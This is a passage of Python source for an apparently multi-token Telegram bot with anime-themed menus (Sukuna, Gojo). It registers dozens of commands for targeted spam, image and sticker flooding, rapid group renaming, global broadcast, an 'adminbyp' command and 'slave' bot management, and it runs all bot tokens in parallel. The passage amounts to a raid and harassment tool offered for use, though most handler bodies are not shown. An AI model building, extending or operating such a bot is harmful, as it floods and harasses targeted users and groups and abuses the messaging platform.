🔥 𝗙𝗔𝗦𝗧 • 𝗦𝗛𝗔𝗥𝗣 • 𝗦𝗨𝗞𝗨𝗡𝗔 🔥
"""

    await update.message.reply_video(
        video=MENU4_VIDEO_URL,
        caption=caption
    )


async def sukuna_spams(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caption = """
╔════════════════════════════════════╗
        👹 𝗦𝗨𝗞𝗨𝗡𝗔 𝗦𝗣𝗔𝗠 𝗠𝗘𝗡𝗨 👹
╚════════════════════════════════════╝

        🔥 『 𝗞𝗜𝗡𝗚 𝗢𝗙 𝗖𝗨𝗥𝗦𝗘𝗦 』 🔥

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚡ ➜ /sukunaspam <text>
      ╰➤ 𝗕𝗔𝗦𝗜𝗖 𝗦𝗨𝗞𝗨𝗡𝗔 𝗦𝗣𝗔𝗠

🔥 ➜ /sukunaspam1 <target>
      ╰➤ 𝗦𝗨𝗞𝗨𝗡𝗔 𝗦𝗣𝗔𝗠 𝗦𝗧𝗬𝗟𝗘 𝟭

🔥 ➜ /sukunaspam2 <target>
      ╰➤ 𝗦𝗨𝗞𝗨𝗡𝗔 𝗦𝗣𝗔𝗠 𝗦𝗧𝗬𝗟𝗘 𝟮

🔥 ➜ /sukunaspam3 <target>
      ╰➤ 𝗦𝗨𝗞𝗨𝗡𝗔 𝗦𝗣𝗔𝗠 𝗦𝗧𝗬𝗟𝗘 𝟯

🔥 ➜ /sukunaspam4 <target>
      ╰➤ 𝗦𝗨𝗞𝗨𝗡𝗔 𝗦𝗣𝗔𝗠 𝗦𝗧𝗬𝗟𝗘 𝟰

🛑 ➜ /sukunaspamstop
      ╰➤ 𝗦𝗧𝗢𝗣 𝗔𝗟𝗟 𝗦𝗨𝗞𝗨𝗡𝗔 𝗦𝗣𝗔𝗠

⛔ ➜ /sukunastop
      ╰➤ 𝗦𝗧𝗢𝗣 𝗦𝗨𝗞𝗨𝗡𝗔 𝗠𝗢𝗗𝗘

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

☠️ 『 𝗦𝗣𝗔𝗠 𝗣𝗢𝗪𝗘𝗥 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗘𝗗 』 ☠️
🔥 𝗙𝗔𝗦𝗧 • 𝗦𝗛𝗔𝗥𝗣 • 𝗦𝗨𝗞𝗨𝗡𝗔 🔥
"""

    await update.message.reply_video(
        video=MENU5_VIDEO_URL,
        caption=caption
    )

async def sukuna_midea(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caption = """
╔════════════════════════════════════╗
        👹 𝗦𝗨𝗞𝗨𝗡𝗔 𝗠𝗘𝗗𝗜𝗔 𝗠𝗘𝗡𝗨 👹
╚════════════════════════════════════╝

        🔥 『 𝗞𝗜𝗡𝗚 𝗢𝗙 𝗖𝗨𝗥𝗦𝗘𝗦 』 🔥

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🖼️ ➜ /sukunaimage
      ╰➤ 𝗜𝗠𝗔𝗚𝗘 𝗠𝗘𝗗𝗜𝗔 𝗖𝗢𝗠𝗠𝗔𝗡𝗗

🎭 ➜ /sukunasticker
      ╰➤ 𝗦𝗧𝗜𝗖𝗞𝗘𝗥 𝗠𝗘𝗗𝗜𝗔 𝗖𝗢𝗠𝗠𝗔𝗡𝗗

📸 ➜ /sukunasetphoto <caption>
      ╰➤ 𝗣𝗛𝗢𝗧𝗢 𝗦𝗘𝗡𝗗 𝗖𝗢𝗠𝗠𝗔𝗡𝗗

🧹 ➜ /sukunaclearphoto
      ╰➤ 𝗖𝗟𝗘𝗔𝗥 𝗣𝗛𝗢𝗧𝗢 𝗠𝗢𝗗𝗘

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

☠️ 『 𝗦𝗨𝗞𝗨𝗡𝗔 𝗠𝗘𝗗𝗜𝗔 𝗣𝗢𝗪𝗘𝗥 』 ☠️
🔥 𝗙𝗔𝗦𝗧 • 𝗖𝗟𝗘𝗔𝗡 • 𝗦𝗨𝗞𝗨𝗡𝗔 🔥
"""

    await update.message.reply_video(
        video=MENU6_VIDEO_URL,
        caption=caption
    )


async def sukuna_swipes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caption = """
╔════════════════════════════════════╗
       👹 𝗦𝗨𝗞𝗨𝗡𝗔 𝗦𝗪𝗜𝗣𝗘 𝗠𝗘𝗡𝗨 👹
╚════════════════════════════════════╝

      🔥 『 𝗦𝗪𝗜𝗣𝗘 • 𝗦𝗟𝗜𝗗𝗘 • 𝗚𝗛𝗢𝗦𝗧 』

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚡ ➜ /swipe
      ╰➤ 𝗦𝗪𝗜𝗣𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗

👹 ➜ /sukunaswipe
      ╰➤ 𝗦𝗨𝗞𝗨𝗡𝗔 𝗦𝗪𝗜𝗣𝗘

👻 ➜ /sukunaghost
      ╰➤ 𝗚𝗛𝗢𝗦𝗧 𝗠𝗢𝗗𝗘

🌀 ➜ /sukunaslide
      ╰➤ 𝗦𝗟𝗜𝗗𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

☠️ 『 𝗦𝗟𝗔𝗦𝗛 • 𝗦𝗪𝗜𝗣𝗘 • 𝗗𝗢𝗠𝗜𝗡𝗔𝗧𝗘 』 ☠️
"""

    await update.message.reply_video(
        video=MENU7_VIDEO_URL,
        caption=caption
    )


async def devil_domain(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caption = """
╔════════════════════════════════════╗
          😈 𝗗𝗘𝗩𝗜𝗟 𝗗𝗢𝗠𝗔𝗜𝗡 😈
╚════════════════════════════════════╝

        ☠️ 『 𝗛𝗜𝗗𝗗𝗘𝗡 𝗖𝗢𝗡𝗧𝗥𝗢𝗟 』 ☠️
      『 𝗗𝗘𝗩𝗜𝗟 𝗖𝗢𝗥𝗘 • 𝗨𝗡𝗟𝗢𝗖𝗞𝗘𝗗 』

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🌍 ➜ /globalactivate
      ╰➤ 𝗚𝗟𝗢𝗕𝗔𝗟 𝗠𝗢𝗗𝗘

⛔ ➜ /offglobal
      ╰➤ 𝗗𝗜𝗦𝗔𝗕𝗟𝗘 𝗚𝗟𝗢𝗕𝗔𝗟

♻️ ➜ /refresh
      ╰➤ 𝗥𝗘𝗙𝗥𝗘𝗦𝗛 𝗦𝗬𝗦𝗧𝗘𝗠

🛠️ ➜ /resetlayout
      ╰➤ 𝗥𝗘𝗦𝗘𝗧 𝗟𝗔𝗬𝗢𝗨𝗧

⚡ ➜ /g
      ╰➤ 𝗤𝗨𝗜𝗖𝗞 𝗚𝗟𝗢𝗕𝗔𝗟

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

😈 「 𝗗𝗘𝗩𝗜𝗟 𝗠𝗢𝗗𝗘 • 𝗛𝗜𝗗𝗗𝗘𝗡 • 𝗔𝗖𝗧𝗜𝗩𝗘 」
☠️ 𝗢𝗡𝗟𝗬 𝗙𝗢𝗥 𝗧𝗛𝗘 𝗖𝗛𝗢𝗦𝗘𝗡 ☠️
"""

    await update.message.reply_video(
        video=MENU8_VIDEO_URL,
        caption=caption
    )


async def sukuna_up(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caption = """
╔════════════════════════════════════╗
        👹 𝗥𝗬𝗢𝗠𝗘𝗡 𝗦𝗨𝗞𝗨𝗡𝗔 👹
╚════════════════════════════════════╝

         『 𝗞𝗜𝗡𝗚 𝗢𝗙 𝗖𝗨𝗥𝗦𝗘𝗦 』

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔥 𝗥𝘆𝗼𝗺𝗲𝗻 𝗦𝘂𝗸𝘂𝗻𝗮 𝗶𝘀 𝘁𝗵𝗲 𝗺𝗼𝘀𝘁
𝗳𝗲𝗮𝗿𝗲𝗱 𝗮𝗻𝗱 𝗽𝗼𝘄𝗲𝗿𝗳𝘂𝗹 𝗰𝘂𝗿𝘀𝗲
𝘁𝗼 𝗲𝘃𝗲𝗿 𝗲𝘅𝗶𝘀𝘁.

⚔️ 𝗛𝗶𝘀 𝗽𝗼𝘄𝗲𝗿 𝗶𝘀 𝗯𝗲𝘆𝗼𝗻𝗱
𝗵𝘂𝗺𝗮𝗻 𝗰𝗼𝗺𝗽𝗿𝗲𝗵𝗲𝗻𝘀𝗶𝗼𝗻,
𝗮𝗻𝗱 𝗵𝗶𝘀 𝗱𝗼𝗺𝗮𝗶𝗻 𝗹𝗲𝗮𝘃𝗲𝘀
𝗻𝗼 𝗰𝗵𝗮𝗻𝗰𝗲 𝗼𝗳 𝗲𝘀𝗰𝗮𝗽𝗲.

👁️ 𝗪𝗵𝗲𝗿𝗲 𝗦𝘂𝗸𝘂𝗻𝗮 𝘄𝗮𝗹𝗸𝘀,
𝗳𝗲𝗮𝗿 𝗳𝗼𝗹𝗹𝗼𝘄𝘀.

🩸 𝗦𝘁𝗿𝗲𝗻𝗴𝘁𝗵 • 𝗗𝗼𝗺𝗶𝗻𝗮𝘁𝗶𝗼𝗻 •
𝗗𝗲𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👹 「 𝗞𝗡𝗘𝗘𝗟 𝗕𝗘𝗙𝗢𝗥𝗘
𝗧𝗛𝗘 𝗞𝗜𝗡𝗚 𝗢𝗙 𝗖𝗨𝗥𝗦𝗘𝗦. 」

☠️ 『 𝗠𝗔𝗟𝗘𝗩𝗢𝗟𝗘𝗡𝗧 𝗦𝗛𝗥𝗜𝗡𝗘 』
"""

    await update.message.reply_video(
        video=MENU9_VIDEO_URL,
        caption=caption
    )


    
async def gojo_up(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caption = """
╔════════════════════════════════════╗
         ⚡ 𝗚𝗢𝗝𝗢 𝗦𝗔𝗧𝗢𝗥𝗨 ⚡
╚════════════════════════════════════╝

        ♾️ 『 𝗧𝗛𝗘 𝗛𝗢𝗡𝗢𝗥𝗘𝗗 𝗢𝗡𝗘 』

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👁️ 𝗚𝗼𝗷𝗼 𝗦𝗮𝘁𝗼𝗿𝘂 𝗶𝘀 𝗸𝗻𝗼𝘄𝗻
𝗮𝘀 𝘁𝗵𝗲 𝘀𝘁𝗿𝗼𝗻𝗴𝗲𝘀𝘁 𝗷𝘂𝗷𝘂𝘁𝘀𝘂
𝘀𝗼𝗿𝗰𝗲𝗿 𝗼𝗳 𝗵𝗶𝘀 𝗲𝗿𝗮.

♾️ 𝗛𝗶𝘀 𝗟𝗶𝗺𝗶𝘁𝗹𝗲𝘀𝘀 𝘁𝗲𝗰𝗵𝗻𝗶𝗾𝘂𝗲
𝗮𝗻𝗱 𝗦𝗶𝘅 𝗘𝘆𝗲𝘀 𝗺𝗮𝗸𝗲 𝗵𝗶𝗺
𝗮𝗻 𝗼𝗽𝗽𝗼𝗻𝗲𝗻𝘁 𝗳𝗲𝘄 𝗰𝗮𝗻
𝗲𝘃𝗲𝗻 𝗰𝗵𝗮𝗹𝗹𝗲𝗻𝗴𝗲.

⚡ 𝗛𝗲 𝗳𝗶𝗴𝗵𝘁𝘀 𝘄𝗶𝘁𝗵
𝗰𝗼𝗻𝗳𝗶𝗱𝗲𝗻𝗰𝗲, 𝗰𝗮𝗹𝗺𝗻𝗲𝘀𝘀,
𝗮𝗻𝗱 𝘂𝗻𝗺𝗮𝘁𝗰𝗵𝗲𝗱 𝘀𝗸𝗶𝗹𝗹.

💙 𝗛𝗶𝘀 𝗴𝗼𝗮𝗹 𝗶𝘀 𝘁𝗼
𝗰𝗿𝗲𝗮𝘁𝗲 𝗮 𝗯𝗲𝘁𝘁𝗲𝗿
𝗳𝘂𝘁𝘂𝗿𝗲 𝗳𝗼𝗿 𝘁𝗵𝗲
𝗻𝗲𝘅𝘁 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗶𝗼𝗻.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

♾️ 「 𝗧𝗛𝗘 𝗦𝗧𝗥𝗢𝗡𝗚𝗘𝗦𝗧
𝗗𝗢𝗘𝗦𝗡'𝗧 𝗡𝗘𝗘𝗗
𝗧𝗢 𝗣𝗥𝗢𝗩𝗘 𝗜𝗧. 」 ♾️

⚡ 『 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬 • 𝗟𝗜𝗠𝗜𝗧𝗟𝗘𝗦𝗦 • 𝗚𝗢𝗝𝗢 』 ⚡
"""

    await update.message.reply_video(
        video=MENU10_VIDEO_URL,
        caption=caption
    )

# ================= BUILD APP =================

def build_app(token):
    app = Application.builder().token(token).build()
    handlers = [
        CommandHandler("ping", ping_cmd),
        CommandHandler("status", status_cmd),
        CommandHandler("dreact", dreact_cmd),
        CommandHandler("stopdreact", stopdreact_cmd),
        CommandHandler("gojodomain", gojo_domain),
        CommandHandler("gojoncs", gojo_ncs),
        CommandHandler("gojorust", gojo_rust),
        CommandHandler("gojoslash", gojo_slash),
        CommandHandler("reacts", reacts_menu),
        CommandHandler("gojoadmins", gojo_admins),
        CommandHandler("sukunadomain", sukuna_domain),
        CommandHandler("targetspams", target_spams),
        CommandHandler("sukunaspams", sukuna_spams),
        CommandHandler("sukunamidea", sukuna_midea),
        CommandHandler("sukunaswipes", sukuna_swipes),
        CommandHandler("devildomain", devil_domain),
        CommandHandler("sukunaup", sukuna_up),
        CommandHandler("gojoup", gojo_up),
        # GOJO NC
        CommandHandler("gojospeed", gojospeed_cmd),
        CommandHandler("gojoflag", gojoflag_cmd),
        CommandHandler("gojoheart", gojoheart_cmd),
        CommandHandler("gojoaesthetic", gojoaesthetic_cmd),
        CommandHandler("gojovegetable", gojovegetable_cmd),
        CommandHandler("gojoanimal", gojoanimal_cmd),
        CommandHandler("gojotime", gojotime_cmd),
        CommandHandler("gojoking", gojoking_cmd),
        CommandHandler("gojonc1", gojonc1_cmd),
        CommandHandler("gojonc2", gojonc2_cmd),
        CommandHandler("gojonc3", gojonc3_cmd),
        CommandHandler("gojonc4", gojonc4_cmd),
        CommandHandler("gojonc5", gojonc5_cmd),
        CommandHandler("gojorush", gojorush_cmd),
        CommandHandler("gojostop", gojostop_cmd),
        # SUKUNA
        CommandHandler("sukunaspam", sukuna_spam_cmd),
        CommandHandler("sukunastop", sukuna_stop_cmd),
        CommandHandler("sukunaimage", sukuna_image_spam_cmd),
        CommandHandler("sukunasticker", sukuna_sticker_spam_cmd),
        CommandHandler("sukunaspamtarget", sukuna_spam_target_cmd),
        CommandHandler("sukunastoptarget", sukuna_stop_target_cmd),
        CommandHandler("sukunaswipe", sukuna_swipe_cmd),
        CommandHandler("sukunastopswipe", sukuna_stop_swipe_cmd),
        CommandHandler("sukunaspam1", sukuna_spam1_cmd),
        CommandHandler("sukunaspam2", sukuna_spam2_cmd),
        CommandHandler("sukunaspam3", sukuna_spam3_cmd),
        CommandHandler("sukunaspam4", sukuna_spam4_cmd),
        CommandHandler("sukunaspamstop", sukuna_stop_spam_cmd),
        CommandHandler("sukunaslide", sukuna_slide_cmd),
        CommandHandler("sukunaghhost", sukuna_ghost_slide_cmd),
        CommandHandler("sukunasetphoto", sukuna_set_photo_cmd),
        CommandHandler("sukunaclearphoto", sukuna_clear_photo_cmd),
        # OLD
        CommandHandler("imagespam", imagespam_cmd),
        CommandHandler("swipe", swipe_cmd),
        CommandHandler("stopswipe", stopswipe_cmd),
        CommandHandler("react", react_cmd),
        CommandHandler("stopreact", stopreact_cmd),
        CommandHandler("changename", changename_cmd),
        CommandHandler("setpfp", setpfp_cmd),
        CommandHandler("changepfp", changepfp_cmd),
        CommandHandler("stop", stop_all_cmd),
        CommandHandler("delaync", delaync_cmd),
        CommandHandler("delayspam", delayspam_cmd),
        CommandHandler("globalactivate", globalactivate_cmd),
        CommandHandler("offglobal", offglobal_cmd),
        CommandHandler("groups", groups_cmd),
        CommandHandler("leaveglobal", leaveglobal_cmd),
        CommandHandler("g", global_broadcast_cmd),
        CommandHandler("target", targetspm_cmd),
        CommandHandler("settemplate", settemplate_cmd),
        CommandHandler("spamtarget", spamtarget_cmd),
        CommandHandler("stoptarget", stoptarget_cmd),
        CommandHandler("showtemplate", showtemplate_cmd),
        CommandHandler("akal", akal_cmd),
        CommandHandler("stickerspam", stickerspam_cmd),
        CommandHandler("timenc", timenc_cmd),
        CommandHandler("kingnc", kingnc_cmd),
        CommandHandler("threads", threads_cmd),
        CommandHandler("getallbots", getallbots_cmd),
        CommandHandler("giveadmin", giveadmin_cmd),
        CommandHandler("adminbyp", adminbyp_cmd),
        CommandHandler("sudo", add_sudo_cmd),
        CommandHandler("listsudo", list_sudo_cmd),
        CommandHandler("delsudo", del_sudo_cmd),
        CommandHandler("owner", owner_cmd),
        CommandHandler("slaves", slaves_cmd),
        CommandHandler("addslave", addslave_cmd),
        CommandHandler("delslave", delslave_cmd),
        CommandHandler("showslave", showslave_cmd),
        CommandHandler("saveslave", saveslave_cmd),
        CommandHandler("gnc", gnc_cmd),
        CommandHandler("setmphoto", setmphoto_cmd),
        CommandHandler("clearmphoto", clearmphoto_cmd),
        CommandHandler("refresh", refresh_cmd),
        CommandHandler("Setlayout", setlayout_cmd),
        CommandHandler("resetlayout", resetlayout_cmd),
        CallbackQueryHandler(gnc_callback, pattern="^gnc_"),
        MessageHandler(filters.TEXT & ~filters.COMMAND, auto_replies)
    ]
    for h in handlers:
        app.add_handler(h)
    return app


bots = [Application.builder().token(t).build().bot for t in TOKENS]


async def run_bots():
    load_data()
    load_slaves()
    global bot_usernames
    bot_usernames = []
    # Parallel bot init for fast startup
    async def init_bot(b):
        try:
            me = await b.get_me()
            return me.username
        except: return None
    results = await asyncio.gather(*[init_bot(b) for b in bots])
    bot_usernames = [r for r in results if r]

    apps = [build_app(t) for t in TOKENS]
    # Parallel app init for fast startup
    await asyncio.gather(*[app.initialize() for app in apps])
    await asyncio.gather(*[app.start() for app in apps])
    await asyncio.gather(*[app.updater.start_polling() for app in apps])
    print("🚀 BOTS RUNNING FAST!")
    while True:
        await asyncio.sleep(3600)


if __name__ == "__main__":
    asyncio.run(run_bots())